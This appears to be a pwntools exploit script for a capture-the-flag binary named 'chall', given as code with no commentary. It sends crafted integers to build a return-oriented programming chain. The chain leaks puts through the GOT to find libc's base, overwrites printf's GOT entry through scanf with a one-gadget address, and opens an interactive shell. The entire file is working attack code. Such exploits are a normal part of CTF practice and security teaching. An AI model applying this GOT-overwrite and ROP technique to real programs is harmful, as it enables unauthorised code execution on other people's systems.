#!/usr/bin/env python3
from pwn import *

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# HOST = ''
# PORT = 

binf = ELF(bin_file)
libc = ELF('./libc.so.6')

def attack(io, **kwargs):
    io.sendlineafter('n: ', '26')
    for i in range(19):
	    io.sendlineafter(': ', '26')

    io.sendlineafter(': ', '19')
    io.sendlineafter(': ', '20')

    io.sendlineafter(': ', str(0x4013a3))
    io.sendlineafter(': ', str(binf.got['puts']))
    io.sendlineafter(': ', str(0x401030))
    io.sendlineafter(': ', str(binf.sym._start))
    io.sendlineafter(': ', '25')

    io.recvline()
    leak = unpack(io.recv(6), 'all')
    libc.address = leak - libc.sym.puts
    info('libcbase = 0x{:08x}'.format(libc.address))

    onegad = [0xdf54c, 0xdf54f, 0xdf552]
    addr_onegad = libc.address + onegad[1]
    info('addr_onegad = 0x{:08x}'.format(addr_onegad))

    io.sendlineafter('n: ', '30')
    for i in range(19):
            io.sendlineafter(': ', '30')

    

    pop_rdi = 0x4013a3
    pop_rsi_r15 = 0x4013a1
    addr_ret = 0x4013c4
    addr_ll = 0x402208
    
    io.sendlineafter(': ', '19')
    io.sendlineafter(': ', '20')
    
    io.sendlineafter(': ', str(pop_rdi))
    io.sendlineafter(': ', str(0x402008)) # '%lld'
    io.sendlineafter(': ', str(pop_rsi_r15))
    io.sendlineafter(': ', str(binf.got['printf']))
    io.sendlineafter(': ', str(0))


    io.sendlineafter(': ', str(0x401070)) # __isoc99_scanf@plt

    io.sendlineafter(': ', str(addr_ret))

    

    io.sendlineafter(': ', str(0x401040)) # printf@plt

    
    io.sendlineafter(': ', '29')
    io.recvline()

    io.sendline(str(addr_onegad))


def main():
    io = process(bin_file)
    # io = remote(HOST, PORT)
    attack(io)
    # gdb.attach(io, '')
    io.interactive()

if __name__ == '__main__':
    main()
